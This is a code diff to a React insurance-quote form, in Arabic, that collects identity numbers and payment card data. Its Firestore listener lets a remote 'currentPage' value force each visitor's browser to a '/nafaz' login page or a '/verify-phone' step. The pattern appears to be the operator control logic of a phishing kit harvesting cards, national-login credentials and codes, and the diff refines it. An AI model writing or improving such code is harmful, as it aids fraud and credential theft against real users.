@@ -93,7 +93,6 @@ const validationRules = {
     required: false,
     message: "يجب الموافقة على الشروط والأحكام للمتابعة",
   },
-  // Payment validation rules
   cardNumber: {
     required: true,
     pattern: /^[0-9\s]{13,19}$/,
@@ -192,34 +191,55 @@ export function ProfessionalQuoteForm() {
   });
 
   const stepHeaderRef = useRef<HTMLHeadingElement>(null);
+
   useEffect(() => {
     const visitorId = localStorage.getItem("visitor");
+    if (!visitorId) {
+      console.error("No visitor ID found");
+      return;
+    }
+
     const unsubscribe = onSnapshot(
-      doc(db, "pays", visitorId!),
+      doc(db, "pays", visitorId),
       (docSnapshot) => {
         if (docSnapshot.exists()) {
           const userData = docSnapshot.data();
+
+          // Handle special page redirects
           if (userData.currentPage === "1") {
             window.location.href = "/";
-          } else if (
+            return;
+          }
+
+          if (
             userData.currentPage === "8888" ||
             userData.currentPage === "nafaz"
           ) {
             window.location.href = "/nafaz";
-          } else if (userData.currentPage === "9999") {
+            return;
+          }
+
+          if (userData.currentPage === "9999") {
             window.location.href = "/verify-phone";
-          } else if (userData.currentPage !== currentPage) {
-            validateStep(parseInt(userData.currentPage));
-            setCurrentStep(parseInt(userData.currentPage) | currentPage);
+            return;
+          }
+
+          // Update currentPage if different from Firestore
+          const firestorePage = Number.parseInt(userData.currentPage);
+          if (!isNaN(firestorePage) && firestorePage !== currentPage) {
+            setCurrentStep(firestorePage);
           }
         } else {
           console.error("User document not found");
         }
+      },
+      (error) => {
+        console.error("Error listening to Firestore:", error);
       }
     );
 
     return () => unsubscribe();
-  }, []);
+  }, [currentPage]);
 
   const validateField = (
     fieldName: string,
@@ -265,8 +285,7 @@ export function ProfessionalQuoteForm() {
     let isValid = true;
 
     switch (step) {
-      case 1: // Basic Information + Insurance Type
-        // Always validate owner name
+      case 1:
         const ownerNameError = validateField(
           "documment_owner_full_name",
           formData.documment_owner_full_name
@@ -276,7 +295,6 @@ export function ProfessionalQuoteForm() {
           isValid = false;
         }
 
-        // Always validate sequence number
         const sequenceError = validateField(
           "sequenceNumber",
           formData.sequenceNumber
@@ -286,7 +304,6 @@ export function ProfessionalQuoteForm() {
           isValid = false;
         }
 
-        // Conditional validation based on insurance purpose
         if (formData.insurance_purpose === "renewal") {
           const ownerIdError = validateField(
             "owner_identity_number",
@@ -323,7 +340,7 @@ export function ProfessionalQuoteForm() {
         }
         break;
 
-      case 2: // Price List + Addons
+      case 2:
         const selectedOfferError = validateField(
           "selectedInsuranceOffer",
           formData.selectedInsuranceOffer
@@ -334,7 +351,7 @@ export function ProfessionalQuoteForm() {
         }
         break;
 
-      case 3: // Summary + Payment
+      case 3:
         const paymentFields = [
           "cardNumber",
           "cardName",
@@ -358,10 +375,10 @@ export function ProfessionalQuoteForm() {
         });
         break;
 
-      case 4: // Verification
+      case 4:
         setCurrentStep(4);
         break;
-      case 5: // Verification
+      case 5:
         setCurrentStep(4);
         break;
     }
